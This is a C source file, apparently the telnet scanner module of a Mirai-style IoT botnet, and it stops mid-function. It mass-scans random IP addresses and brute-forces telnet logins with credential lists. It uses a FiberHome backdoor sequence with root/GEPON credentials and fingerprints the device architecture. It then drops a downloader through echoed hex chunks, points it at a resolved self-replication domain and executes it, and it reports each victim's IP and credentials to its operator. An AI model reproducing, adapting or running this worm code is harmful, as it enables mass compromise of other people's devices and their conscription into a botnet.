#include <netinet/in.h>
#include <stdbool.h>

#include <arpa/inet.h>
#include <elf.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#include <linux/ip.h>
#include <linux/tcp.h>

#include "bot/client/client.h"
#include "bot/config/table.h"
#include "bot/definitions.h"
#include "bot/endianness.h"
#include "bot/resolver/resolver.h"
#include "bot/utils/bytebuf.h"
#include "bot/utils/hexadecimal.h"
#include "bot/utils/network.h"
#include "bot/utils/string.h"
#include "bot/utils/tokenizer.h"
#include "bot/utils/xoshiro.h"

#include "bot/modules/scanner/downloader.h"
#include "bot/modules/scanner/ip_list.h"
#include "bot/modules/scanner/telnet_scanner.h"
#include "regex/re.h"

char *dirs[] = {
    "/var/", "/var/tmp/", "/var/run/", "/dev/",  "/dev/shm/", "/data/",
    "/etc/", "/mnt/",     "/usr/",     "/boot/", "/home/",    "/root/",
};

static void scanner_setup_conn(pscanner_connection_t);
static void scanner_reset_conn(pscanner_connection_t, bool);

static int scanner_consume_prompt(pscanner_connection_t);

/* processes login */
static int scanner_consume_iacs(pscanner_connection_t);
static int scanner_consume_username(pscanner_connection_t);
static int scanner_consume_password(pscanner_connection_t);
static int scanner_consume_fail(pscanner_connection_t);
static int scanner_consume_query(pscanner_connection_t);

/* processes arch determination */
static int scanner_consume_elf(pscanner_connection_t conn);
static int scanner_consume_arm(pscanner_connection_t conn);

/* processes file execution */
static int scanner_consume_execution(pscanner_connection_t conn);

/* processes ftth enabling */
static int scanner_consume_ftth(pscanner_connection_t);

/* processes failures and binary dropping */
static void scanner_process_fail(pscanner_connection_t);
static bool scanner_process_binary(pscanner_connection_t);
static int scanner_banner_match(pscanner_connection_t);

static pscanner_auth_t scanner_retrieve_sauth(const char *, const char *);

static bool can_consume(pscanner_connection_t, uint8_t *, int);

static int scanner_pid = -1;
static int rsck = -1;
static time_t last_time = 0;

static char scanner_rawpkt[sizeof(struct iphdr) + sizeof(struct tcphdr)] = {0};
static pscanner_connection_t conn_table;
static int active_connections = 0;
static int last_avail_conn = 0;

pscanner_connection_t find_available_connection() {
  pscanner_connection_t conn = NULL;

  for (int n = last_avail_conn; n < SCANNER_MAX_CONNS; n++) {
    if (conn_table[n].state == SC_CLOSED) {
      conn = &conn_table[n];
      last_avail_conn = n;
      break;
    }
  }

  return conn;
}

// me when i can copy out of fucking IDA
int recv_strip_null(int sock, char *buf, int len, int flags) {
  int ret; // [esp+20h] [ebp-8h]
  int i;   // [esp+24h] [ebp-4h]

  ret = recv(sock, buf, len, flags);
  if (ret > 0) {
    for (i = 0; i < ret; ++i) {
      if (!buf[i]) buf[i] = 'A';
    }
  }

  return ret;
}

void scanner_init(void) {
  downloader_init();

  int i;
  uint16_t source_port;
  struct iphdr *iph;
  struct tcphdr *tcph;

  // Let parent continue on main thread
  scanner_pid = fork();
  if (scanner_pid > 0 || scanner_pid == -1) return;

  uint32_t local_addr = network_local_addr();
  last_time = time(NULL);

  conn_table = calloc(SCANNER_MAX_CONNS, sizeof(struct scanner_connection));
  for (i = 0; i < SCANNER_MAX_CONNS; i++) {
    conn_table[i].state = SC_CLOSED;
    conn_table[i].fd = -1;
  }

  // Set up raw socket scanning and payload
  if ((rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1) {
    LOG_ERROR("Failed to initialize raw socket");
    exit(0);
  }

  fcntl(rsck, F_SETFL, O_NONBLOCK | fcntl(rsck, F_GETFL, 0));

  i = 1;
  if (setsockopt(rsck, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) != 0) {
    LOG_ERROR("Failed to set IPHDRINCL");
    close(rsck);
    exit(0);
  }

  do {
    source_port = xoshiro_next() & 0xffff;
  } while (ntohs(source_port) < 1024);

  iph = (struct iphdr *)scanner_rawpkt;
  tcph = (struct tcphdr *)(iph + 1);

  iph->ihl = 5;
  iph->version = 4;
  iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
  iph->id = xoshiro_next();
  iph->ttl = 64;
  iph->protocol = IPPROTO_TCP;

  tcph->dest = htons(SCANNER_TELNET_PORT);
  tcph->source = source_port;
  tcph->doff = 5;
  tcph->window = xoshiro_next() & 0xffff;
  tcph->syn = true;

  LOG_INFO("Initialized scanner!");

  // Main logic loop
  while (true) {
    int base = active_connections ? SCANNER_MAX_CONNS - active_connections : SCANNER_MAX_CONNS;
    for (i = 0; i < base; i++) {
      struct sockaddr_in paddr = {0};
      struct iphdr *iph = (struct iphdr *)scanner_rawpkt;
      struct tcphdr *tcph = (struct tcphdr *)(iph + 1);

      iph->id = xoshiro_next();
      iph->saddr = local_addr;
      iph->daddr = scanner_random_ip();

      iph->check = 0;
      iph->check = csum_compute((uint16_t *)iph, sizeof(struct iphdr));

      tcph->dest = htons(SCANNER_TELNET_PORT);
      tcph->seq = iph->daddr;

      tcph->check = 0;
      tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));

      paddr.sin_family = AF_INET;
      paddr.sin_addr.s_addr = iph->daddr;
      paddr.sin_port = tcph->dest;

      sendto(rsck, scanner_rawpkt, sizeof(scanner_rawpkt), MSG_NOSIGNAL, (struct sockaddr *)&paddr,
             sizeof(paddr));
    }

    last_avail_conn = 0;

    char buffer[1514];
    struct iphdr *ip_header;
    struct tcphdr *tcp_header;
    int n;
    while ((n = recvfrom(rsck, buffer, 1514, MSG_DONTWAIT, NULL, NULL)) > 0) {
      if (n < sizeof(struct iphdr) + sizeof(struct tcphdr)) continue; // Minimum TCP/IP header size

      ip_header = (struct iphdr *)buffer;
      tcp_header = (struct tcphdr *)(buffer + sizeof(struct iphdr));

      // Validate packet
      if (ip_header->daddr != local_addr || ip_header->protocol != IPPROTO_TCP) {
        continue;
      }

      // we only want telnet
      // CHANGE THIS TOO
      if (tcp_header->source != htons(SCANNER_TELNET_PORT)) {
        continue;
      }

      // only want OUR source port
      if (tcp_header->dest != source_port) {
        continue;
      }

      // ONLY NEED THOSE SYN ACKS!!
      if (!tcp_header->syn) continue;
      if (!tcp_header->ack) continue;
      if (tcp_header->rst) continue;
      if (tcp_header->fin) continue;

      // find available connection slot
      pscanner_connection_t conn = find_available_connection();
      if (!conn) continue;

      conn->dst_addr = ip_header->saddr;
      conn->dst_port = tcp_header->source;

      // reset ELF
      memset(&conn->elf, '\0', sizeof(scanner_elf_t));

      // yeah
      conn->timeout = xoshiro_range(15, 30);
      conn->use_random_cred = true;
      conn->banner = NULL;
      conn->tries = 0;

      scanner_setup_conn(conn);
    }

    fd_set read_set, write_set;
    struct timeval timeout;
    int max_fd = 0;

    last_time = time(NULL);
    active_connections = 0;

    FD_ZERO(&read_set);
    FD_ZERO(&write_set);

    for (int i = 0; i < SCANNER_MAX_CONNS; i++) {
      pscanner_connection_t conn = &conn_table[i];
      if (conn->fd == -1 || !conn->state) continue;

      // check timeout
      if (last_time - conn->last_recv > conn->timeout) {
        LOG_WARN("FD%d timed out (state = %d)", conn->fd, conn->state);
        scanner_reset_conn(conn, false);
        continue;
      }

      if (conn->fd > max_fd) {
        max_fd = conn->fd;
      }

      // switch fd sets
      if (conn->state == SC_CONNECTING) {
        FD_SET(conn->fd, &write_set);
      } else {
        FD_SET(conn->fd, &read_set);
      }

      active_connections++;
    }

    // just straight up continue if no connections
    if (!active_connections) {
      continue;
    }

    timeout.tv_sec = 1;
    timeout.tv_usec = 0;

    int ret = select(max_fd + 1, &read_set, &write_set, NULL, &timeout);
    // if (ret <= 0) continue;

    for (int i = 0; i < SCANNER_MAX_CONNS; i++) {
      pscanner_connection_t conn = &conn_table[i];
      if (conn->fd == -1 || !conn->state) continue;

      if (FD_ISSET(conn->fd, &write_set)) {
        int err = 0, ret = 0;
        socklen_t err_len = sizeof(err);

        // check if we actually connected
        ret = getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
        if (err == 0 && ret == 0) {
          conn->state = SC_HANDLE_IACS;
          conn->rdbuf_pos = 0;
          continue;
        }

        scanner_reset_conn(conn, false);
        continue;
      }

      if (FD_ISSET(conn->fd, &read_set)) {
        while (true) {
          int ret;

          if (conn->state == SC_CLOSED) {
            break;
          }

          // if buf is full, move
          if (conn->rdbuf_pos == SCANNER_RDBUF_SIZE) {
            memmove(conn->rdbuf, conn->rdbuf + SCANNER_HACK_DRAIN,
                    SCANNER_RDBUF_SIZE - SCANNER_HACK_DRAIN);
            conn->rdbuf_pos -= SCANNER_HACK_DRAIN;
          }

          errno = 0;

          // we only wanna use strip null when not determining the architecture
          if (conn->state != SC_WAITING_DETERMINE_ARCH)
            ret = recv_strip_null(conn->fd, conn->rdbuf + conn->rdbuf_pos,
                                  SCANNER_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);
          else
            ret = recv(conn->fd, conn->rdbuf + conn->rdbuf_pos,
                       SCANNER_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);

          // check if err
          if (ret == 0) {
            errno = ECONNRESET;
            ret = -1;
          }

          // reset conn
          if (ret < 0) {
            if (errno != EAGAIN && errno != EWOULDBLOCK) {
              scanner_reset_conn(conn, false);
            }

            break;
          }

          // advance buffer
          conn->rdbuf_pos += ret;
          conn->last_recv = last_time;

          while (true) {
            int consumed = 0;

            switch (conn->state) {
              case SC_HANDLE_IACS: {
                if ((consumed = scanner_consume_iacs(conn)) > 0) {
                  conn->state = SC_WAITING_USERNAME;
                  LOG_TRACE("FD%d finished telnet negotiation", conn->fd);
                }
              } break;

              case SC_WAITING_USERNAME: {
                if ((consumed = scanner_consume_username(conn)) > 0) {
                  if (!conn->banner && !scanner_banner_match(conn)) {
                    scanner_reset_conn(conn, false);
                    break;
                  }

                  // retrives the authentication based of index
                  conn->auth = &conn->banner->credentials[conn->tries];

                  LOG_TRACE("FD%d received username prompt [%s:%s]", conn->fd, conn->auth->username,
                            conn->auth->password);

                  // Send username
                  send(conn->fd, conn->auth->username, strlen(conn->auth->username), MSG_NOSIGNAL);
                  send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);

                  conn->state = SC_WAITING_PASSWORD;
                }
              } break;

              case SC_WAITING_PASSWORD: {
                if ((consumed = scanner_consume_password(conn)) > 0) {
                  LOG_TRACE("FD%d received password prompt", conn->fd);

                  // Send password
                  send(conn->fd, conn->auth->password, strlen(conn->auth->password), MSG_NOSIGNAL);
                  send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);

                  conn->state = SC_WAITING_PASSWD_RESP;
                }
              } break;

              case SC_WAITING_PASSWD_RESP: {
                if (scanner_consume_fail(conn) == -1) {
                  scanner_process_fail(conn);
                  break;
                }

                /* checks if we have a prompt */
                if ((consumed = scanner_consume_prompt(conn)) > 0) {
                  // send enables
                  send(conn->fd, "sh\r\nshell\r\nenable\r\nsystem\r\nping; sh\r\n\r\n", 39,
                       MSG_NOSIGNAL);

                  // write query
                  const char *query = table_retrieve(TABLE_SCANNER_QUERY, NULL);
                  send(conn->fd, query, strlen(query), MSG_NOSIGNAL);
                  send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                  table_lock(TABLE_SCANNER_QUERY);

                  // wait for token resp
                  conn->state = SC_WAITING_TOKEN_RESP;
                }
              } break;
              case SC_WAITING_TOKEN_RESP: {
                if (scanner_consume_fail(conn) == -1) {
                  scanner_process_fail(conn);
                  break;
                }

                if ((consumed = scanner_consume_query(conn)) > 0) {
                  char tmp[4096] = {0};

                  LOG_INFO("FD%d login success [%d.%d.%d.%d] [%s:%s]", conn->fd,
                           conn->dst_addr & 0xFF, (conn->dst_addr >> 8) & 0xFF,
                           (conn->dst_addr >> 16) & 0xFF, (conn->dst_addr >> 24) & 0xFF,
                           conn->auth->username, conn->auth->password);

                  // if we havent gotten the arch yet, get the architecture
                  if (!conn->elf.machine) {
                    send(conn->fd, "/bin/busybox cat /proc/self/exe || cat /proc/self/exe", 53,
                         MSG_NOSIGNAL);
                    send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                    conn->state = SC_WAITING_DETERMINE_ARCH;
                    break;
                  }

                  // go through all directories, try to write into one
                  for (int j = 0; j < sizeof(dirs) / sizeof(dirs[0]); j++) {
                    memset(tmp, '\0', sizeof(tmp));

                    // >.f && chmod 777 %s/.f && %s/.f

                    strcpy(tmp, ">");
                    strcat(tmp, dirs[j]);
                    strcat(tmp, ".f && chmod 777 ");
                    strcat(tmp, dirs[j]);
                    strcat(tmp, ".f && ");
                    strcat(tmp, dirs[j]);
                    strcat(tmp, ".f && cd ");
                    strcat(tmp, dirs[j]);
                    strcat(tmp, "; ");

                    // send confirmation string thing
                    if (j == sizeof(dirs) / sizeof(dirs[0]) - 1) {
                      strcat(tmp, table_retrieve(TABLE_SCANNER_QUERY, NULL));
                      table_lock(TABLE_SCANNER_QUERY);
                    }

                    LOG_INFO("%s", tmp);

                    send(conn->fd, tmp, strlen(tmp), MSG_NOSIGNAL);
                    send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                  }

                  conn->state = SC_WAITING_DIR_RESP;
                }
              } break;

              // wait for the dir query response
              case SC_WAITING_DIR_RESP: {
                if ((consumed = scanner_consume_query(conn)) > 0) {
                  LOG_INFO("FD%d received query response after dir", conn->fd);

                  // if we don't have arch determination yet, do it
                  conn->state = SC_WAITING_DROP_BINARY;

                  // if we did actually determine arch and we have ARM,
                  // we need to get the sub-type, so we do it over /proc/cpuinfo
                  if (conn->elf.machine == EM_ARM) {
                    send(conn->fd, "/bin/busybox cat /proc/cpuinfo || cat /proc/cpuinfo", 51,
                         MSG_NOSIGNAL);
                    send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);

                    conn->state = SC_WAITING_DETERMINE_SUBTYPE;
                    break;
                  }

                  // send query string
                  const char *query = table_retrieve(TABLE_SCANNER_QUERY, NULL);
                  send(conn->fd, query, strlen(query), MSG_NOSIGNAL);
                  send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                  table_lock(TABLE_SCANNER_QUERY);
                }
              } break;

              // we consume the architecture, endianess and bitness then just reconnect. not doing
              // so can cause issues later on :(
              case SC_WAITING_DETERMINE_ARCH: {
                if ((consumed = scanner_consume_elf(conn)) > 0) {

                  // disable random cred retrieval, reconnect to shell lol
                  conn->use_random_cred = false;
                  conn->banner->len = 1;

                  scanner_reset_conn(conn, true);
                }
              } break;

              case SC_WAITING_DETERMINE_SUBTYPE: {
                if ((consumed = scanner_consume_arm(conn)) > 0) {
                  LOG_INFO("FD%d appears to be armv%dl!", conn->fd, conn->elf.type);

                  const char *query = table_retrieve(TABLE_SCANNER_QUERY, NULL);
                  send(conn->fd, query, strlen(query), MSG_NOSIGNAL);
                  send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                  table_lock(TABLE_SCANNER_QUERY);

                  conn->state = SC_WAITING_DROP_BINARY;
                }
                break;
              }

              case SC_WAITING_DROP_BINARY: {
                if (conn->dropper == NULL) {
                  int len;

                  // TODO make a table entry for this
                  resolver_response_t resp;
                  int ret =
                      resolver_query(table_retrieve(TABLE_SELFREP_DOMAIN, NULL), &resp, DNS_TYPE_A);
                  table_lock(TABLE_SELFREP_DOMAIN);

                  if (ret != 0 || resp.len == 0) {
                    resolver_free(&resp);
                    scanner_reset_conn(conn, false);
                    break;
                  }

                  LOG_INFO(
                      "replacing dlr with %s",
                      inet_ntoa(((struct sockaddr_in){.sin_addr = resp.records[0].a}).sin_addr));

                  // replace downloader ip
                  char *data = downloader_replace(&conn->elf,
                                                  resp.records[xoshiro_next() % resp.len].a, &len);
                  resolver_free(&resp); // now we just free it again and we ball

                  if (!data) {
                    scanner_reset_conn(conn, false);
                    break;
                  }

                  // split into chunks of 32 bytes
                  conn->dropper = hex_split((uint8_t *)data, len, 64, &conn->dropper_chunks);
                  conn->dropper_index = 0;

                  free(data);
                  LOG_DEBUG("FD%d converted binary to ['%d'] hex chunks", conn->fd,
                            conn->dropper_chunks);
                }

                // yip yap yop
                if ((consumed = scanner_consume_query(conn)) > 0) {
                  if (scanner_process_binary(conn)) {
                    // executes our execution function
                    send(conn->fd,
                         "/bin/busybox chmod 777 .d; ./.d > .f; /bin/busybox chmod 777 .f; ./.f "
                         "telnet; rm -rf .d",
                         87, MSG_NOSIGNAL);
                    send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);

                    // set state
                    conn->state = SC_WAITING_EXECUTE;
                    conn->timeout += 5;

                    // frees the dropper
                    free(conn->dropper);
                    conn->dropper = NULL;

                    // resets chunks etc
                    conn->dropper_index = 0;
                    conn->dropper_chunks = 0;
                  }
                }
              } break;

              case SC_WAITING_EXECUTE: {
                if ((consumed = scanner_consume_execution(conn)) > 0) {
                  pbytebuf_t buf = bytebuf_new_write();
                  bytebuf_write_uint32(buf, conn->dst_addr);
                  bytebuf_write_uint16(buf, conn->dst_port);
                  bytebuf_write_string(buf, conn->auth->username);
                  bytebuf_write_string(buf, conn->auth->password);
                  bytebuf_write_uint8(buf, SC_REP_EXECUTED);
                  pipe_write(REPORT_TELNET, buf);
                  bytebuf_free(buf, NULL);

                  LOG_INFO("FD%d executed malware!", conn->fd);
                  scanner_reset_conn(conn, false);
                }
              } break;

              // last state, this is literally just a special handling
              case SC_WAITING_FTTH_RESPONSE: {
                if ((consumed = scanner_consume_ftth(conn)) > 0) {
                  LOG_INFO("FD%d (special) enabled telnet shell, reconnecting on port 26",
                           conn->fd);

                  conn->dst_port = htons(26);

                  // use gepon as cred
                  if (!conn->banner) {
                    conn->banner = malloc(sizeof(scanner_banner_t));
                    conn->banner->credentials[0] = *scanner_retrieve_sauth("root", "GEPON");
                    conn->banner->len = 1;
                  } else
                    LOG_INFO("CANT GET GEPON CRED!");

                  // dont use random cred
                  conn->use_random_cred = false;
                  scanner_reset_conn(conn, true);
                }
              } break;

              default:
                consumed = 0;
                break;
            }

            // If no data was consumed, move on
            if (consumed == 0)
              break;
            else {
              if (consumed > conn->rdbuf_pos) consumed = conn->rdbuf_pos;

              conn->rdbuf_pos -= consumed;
              memmove(conn->rdbuf, conn->rdbuf + consumed, conn->rdbuf_pos);
            }
          }
        }
      }
    }

    // TODO handle reading
  }
}

void scanner_kill(void) {
  if (scanner_pid == -1) return;

  kill(scanner_pid, 9);
  scanner_pid = -1;
}

static void scanner_setup_conn(pscanner_connection_t conn) {
  struct sockaddr_in addr = {0};

  if (conn->fd != -1) {
    close(conn->fd);
  }

  if ((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
    return;
  }

  conn->rdbuf_pos = 0;

  conn->dropper = NULL;
  conn->dropper_index = 0;
  conn->dropper_chunks = 0;

  memset(conn->rdbuf, '\0', sizeof(conn->rdbuf));
  fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));

  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = conn->dst_addr;
  addr.sin_port = conn->dst_port;

  conn->last_recv = last_time;
  conn->state = SC_CONNECTING;

  int _ = connect(conn->fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
  if (_) {
  }
}

static void scanner_reset_conn(pscanner_connection_t conn, bool reconn) {
  if (conn->fd >= 0) close(conn->fd);

  // we don't wanna mem leak
  if (conn->dropper) {
    free(conn->dropper);

    conn->dropper = NULL;
    conn->dropper_index = 0;
    conn->dropper_chunks = 0;
  }

  // bannerz
  if (!reconn && conn->banner) {
    free(conn->banner);
    conn->banner = NULL;
    conn->tries = 0;
  }

  // now we just set the fd, it doesnt matter
  conn->state = SC_CLOSED;
  conn->fd = -1;

  // reconnect ig
  if (reconn) {
    scanner_setup_conn(conn);
  }
}

static int scanner_consume_iacs(pscanner_connection_t conn) {
  // fuck iacs if its an FTTH

  char *ftth_query = (char *)table_retrieve(TABLE_SCANNER_FTTH, NULL);
  int pos = str_search(conn->rdbuf, ftth_query, conn->rdbuf_pos, strlen(ftth_query));
  table_lock(TABLE_SCANNER_FTTH);

  if (pos != -1) {
    LOG_INFO("FD%d (special) found FiberHome, sending magic!", conn->fd);
    send(conn->fd, "\x1a\x0a\x64\x64\x64\x0a\x74\x73\x68\x65\x6c\x6c\x0a\x73\x68\x65\x6c\x6c\x0a",
         18, MSG_NOSIGNAL);
    conn->state = SC_WAITING_FTTH_RESPONSE;
    return 0;
  }

  int consumed = 0;
  uint8_t *ptr = (uint8_t *)conn->rdbuf;

  while (consumed < conn->rdbuf_pos && *ptr == 0xff) {
    if (!can_consume(conn, ptr, 1)) break;

    if (ptr[1] == 0xff) {
      ptr += 2;
      consumed += 2;
    } else if (ptr[1] == 0xfd && can_consume(conn, ptr, 2) && ptr[2] == 31) {
      uint8_t will_naws[] = {255, 251, 31};
      uint8_t naws_resp[] = {255, 250, 31, 0, 80, 0, 24, 255, 240};
      send(conn->fd, will_naws, 3, MSG_NOSIGNAL);
      send(conn->fd, naws_resp, 9, MSG_NOSIGNAL);
      ptr += 3;
      consumed += 3;
    } else {
      if (!can_consume(conn, ptr, 2)) break;

      // Convert DO to DONT, WILL to DO
      for (int i = 0; i < 3; i++) {
        if (ptr[i] == 0xfd)
          ptr[i] = 0xfc;
        else if (ptr[i] == 0xfb)
          ptr[i] = 0xfd;
      }

      send(conn->fd, ptr, 3, MSG_NOSIGNAL);
      ptr += 3;
      consumed += 3;
    }
  }
  return consumed;
}

static int scanner_consume_prompt(pscanner_connection_t conn) {
  return scanner_find_prompt(conn, NULL, 0);
}

static int scanner_consume_username(pscanner_connection_t conn) {
  ptokenizer_t splitter = table_retrieve_list(TABLE_SCANNER_USER);
  return scanner_find_splitter(conn, splitter);
}

static int scanner_banner_match(pscanner_connection_t conn) {
  conn->banner = malloc(sizeof(scanner_banner_t));
  if (!conn->banner) return false;

  memset(conn->banner, 0, sizeof(scanner_banner_t));
  conn->banner->banner = NULL;
  conn->banner->len = 0;

  bool found = false;
  size_t banner_count = sizeof(banners) / sizeof(banners[0]);

  for (size_t i = 0; i < banner_count; i++) {
    pscanner_banner_t banner = &banners[i];

    if (!banner->regex) {
      if (str_search(conn->rdbuf, (char *)banner->banner, conn->rdbuf_pos,
                     strlen(banner->banner)) != -1) {
        found = true;
      }
    } else {
      int match_result;

      if (re_match(banner->banner, conn->rdbuf, &match_result) != -1) {
        found = true;
      }
    }

    if (found) {
      memcpy(conn->banner, banner, sizeof(scanner_banner_t));
      LOG_INFO("Banner matched: %s : %d.%d.%d.%d", banner->banner, conn->dst_addr & 0xFF,
               (conn->dst_addr >> 8) & 0xFF, (conn->dst_addr >> 16) & 0xFF,
               (conn->dst_addr >> 24) & 0xFF);
      break;
    }
  }

  // Populate credentials based on match result
  if (found) {
    int target_len = conn->banner->len + 10;
    if (target_len > 50) target_len = 50;

    while (conn->banner->len < target_len) {
      scanner_auth_t *cred = (xoshiro_next() % 3) ? retrieve_small_cred() : retrieve_big_cred();
      conn->banner->credentials[conn->banner->len].username = cred->username;
      conn->banner->credentials[conn->banner->len].password = cred->password;
      conn->banner->len++;
    }
  } else {
    memset(conn->banner, 0, sizeof(scanner_banner_t));
    conn->banner->banner = NULL;
    conn->banner->len = 0;

    // Add 2 default small credentials
    conn->banner->credentials[0] = scanner_auth_small[0];
    conn->banner->credentials[1] = scanner_auth_small[1];
    conn->banner->len = 2;

    // Fill remaining up to 20 total
    while (conn->banner->len < 20) {
      scanner_auth_t *cred = (xoshiro_next() % 3) ? retrieve_small_cred() : retrieve_big_cred();
      conn->banner->credentials[conn->banner->len].username = cred->username;
      conn->banner->credentials[conn->banner->len].password = cred->password;
      conn->banner->len++;
    }
  }

  // Ensure length is within bounds
  if (conn->banner->len > 100) {
    conn->banner->len = 100;
  }

  // LOG_INFO("Banner credentials count: %d", conn->banner->len);
  return true;
}

static int scanner_consume_password(pscanner_connection_t conn) {
  ptokenizer_t splitter = table_retrieve_list(TABLE_SCANNER_PASSWORD);
  return scanner_find_splitter(conn, splitter);
}

/* consumes failed login prompts */
static int scanner_consume_fail(pscanner_connection_t conn) {
  int pos = 0;
  ptokenizer_t splitter = table_retrieve_list(TABLE_SCANNER_FAIL);

  // search for fialure prompts
  for (int i = 0; i < splitter->size; i++) {
    if (str_search(conn->rdbuf, splitter->tokens[i], conn->rdbuf_pos,
                   strlen(splitter->tokens[i])) != -1) {
      /*LOG_ERROR("FD%d login failed (%s:%s) (%s) (%d/%d)", conn->fd, conn->auth->username,
                conn->auth->password, splitter->tokens[i], conn->tries, conn->banner->len);*/
      pos = -1;
      break;
    }
  }

  // free, return pos
  tokenizer_free(splitter);
  return pos;
}

/* consumes query string */
static int scanner_consume_query(pscanner_connection_t conn) {
  // FINDME: HISILICON: applet not found

  // decrypt data
  char *data = (char *)table_retrieve(TABLE_SCANNER_QUERY_RESP, NULL);
  int pos = str_search(conn->rdbuf, data, conn->rdbuf_pos, strlen(data));
  table_lock(TABLE_SCANNER_QUERY_RESP);

  return pos == -1 ? 0 : pos;
}

/* consumes an elf binary to get device architecture info */
static int scanner_consume_elf(pscanner_connection_t conn) {

  /* this should..technically never happen.. right? i mean.. we literally cat /proc/self/exe */
  if (str_search(conn->rdbuf, "o such file or directory", conn->rdbuf_pos, 24) != -1) {
    scanner_reset_conn(conn, false);
    return -1;
  }

  if (str_search(conn->rdbuf, "command not found", conn->rdbuf_pos, 17) != -1) {
    scanner_reset_conn(conn, false);
    return -1;
  }

  int pos = str_search(conn->rdbuf, "ELF", conn->rdbuf_pos, 3);
  if (pos == -1) return 0;

  // skip the rest of ident and extract machine
  uint16_t machine;
  memcpy(&machine, &conn->rdbuf[pos + 14], sizeof(machine));

  conn->elf.machine = machine;
  conn->elf.endianess = conn->rdbuf[pos + 1];
  conn->elf.bit = conn->rdbuf[pos + 2];

  // this is so goofy and shit but fuck it we ball
#if IS_BIG_ENDIAN
  if (conn->elf.endianess == ELFDATA2LSB) {
    conn->elf.machine = SWAP16(conn->elf.machine);
  }
#else
  if (conn->elf.endianess == ELFDATA2MSB) {
    conn->elf.machine = SWAP16(conn->elf.machine);
  }
#endif

  // validate fields
  if (conn->elf.machine == EM_386 || conn->elf.machine == 0 || conn->elf.endianess == 0 ||
      conn->elf.bit == 0) {
    scanner_reset_conn(conn, false);
    return -1;
  }

  // we retrieved the architecture, reconnect
  LOG_INFO("FD%d retrieved architecture %d (%s endian)", conn->fd, conn->elf.machine,
           conn->elf.endianess == 2 ? "big" : "little");
  scanner_reset_conn(conn, true);

  // report telnet to server
  pbytebuf_t buf = bytebuf_new_write();
  bytebuf_write_uint32(buf, conn->dst_addr);
  bytebuf_write_uint16(buf, conn->dst_port);
  bytebuf_write_string(buf, conn->auth->username);
  bytebuf_write_string(buf, conn->auth->password);
  bytebuf_write_uint8(buf, SC_REP_BRUTED);
  pipe_write(REPORT_TELNET, buf);
  bytebuf_free(buf, NULL);

  return pos;
}

/* consumes the arm sub-type, we need this to get the right binary */
static int scanner_consume_arm(pscanner_connection_t conn) {
  int consumed = str_search(conn->rdbuf, "rocessor", conn->rdbuf_pos, 8);
  if (consumed == -1) consumed = str_search(conn->rdbuf, "model", conn->rdbuf_pos, 5);

  // it's still -1, just bail atp
  if (consumed == -1) return 0;

  int arm4 = str_search(conn->rdbuf, "v4l", conn->rdbuf_pos, 3);
  if (arm4 != -1) conn->elf.type = ELF_ARM_V4L;

  int arm5 = str_search(conn->rdbuf, "v5l", conn->rdbuf_pos, 3);
  if (arm5 != -1) conn->elf.type = ELF_ARM_V5L;

  int arm6 = str_search(conn->rdbuf, "v6l", conn->rdbuf_pos, 3);
  if (arm6 != -1) conn->elf.type = ELF_ARM_V5L;

  int arm7 = str_search(conn->rdbuf, "v7l", conn->rdbuf_pos, 3);
  if (arm7 != -1) conn->elf.type = ELF_ARM_V7L;

  return consumed;
}

/* consumes our execution message */
static int scanner_consume_execution(pscanner_connection_t conn) {
  size_t len;
  const char *exec_msg = table_retrieve(TABLE_EXEC_MESSAGE, &len);
  int pos = str_search(conn->rdbuf, (char *)exec_msg, conn->rdbuf_pos, len);
  table_lock(TABLE_EXEC_MESSAGE);
  return pos == -1 ? 0 : pos;
}

/* consumes the FTTH telnet enable response */
static int scanner_consume_ftth(pscanner_connection_t conn) {
  int pos = str_search(conn->rdbuf, (char *)table_retrieve(TABLE_SCANNER_FTTH_RESP, NULL),
                       conn->rdbuf_pos, 9);
  table_lock(TABLE_SCANNER_FTTH_RESP);
  return pos == -1 ? 0 : pos;
}

/* echo drops a binary to the device */
static bool scanner_process_binary(pscanner_connection_t conn) {
  if (conn->dropper_index == conn->dropper_chunks) {
    LOG_INFO("FD%d Dropped downloader, executing", conn->fd);
    return true;
  }

  char tmp_buf[4096] = {0};

  strcpy(tmp_buf, "echo -n${MONITOR}e '");
  strcat(tmp_buf, conn->dropper[conn->dropper_index]);
  strcat(tmp_buf, "' ");
  strcat(tmp_buf, conn->dropper_index == 0 ? "> " : ">> ");
  strcat(tmp_buf, ".d && ");
  strcat(tmp_buf, table_retrieve(TABLE_SCANNER_QUERY, NULL));
  strcat(tmp_buf, "\r\n");

  table_lock(TABLE_SCANNER_QUERY);

  send(conn->fd, tmp_buf, strlen(tmp_buf), MSG_NOSIGNAL);

  conn->dropper_index++;
  LOG_DEBUG("FD%d Dropping %d/%d of the downloader", conn->fd, conn->dropper_index,
            conn->dropper_chunks);

  return false;
}

static void scanner_process_fail(pscanner_connection_t conn) {
  if (++(conn->tries) == conn->banner->len) {
    LOG_ERROR("FD%d too many auth retries, bailing", conn->fd);
    scanner_reset_conn(conn, false);
    return;
  }

  if (conn->fd >= 0) {
    close(conn->fd);
    conn->fd = -2;
  }

  scanner_reset_conn(conn, true);
}

static pscanner_auth_t scanner_retrieve_sauth(const char *username, const char *password) {

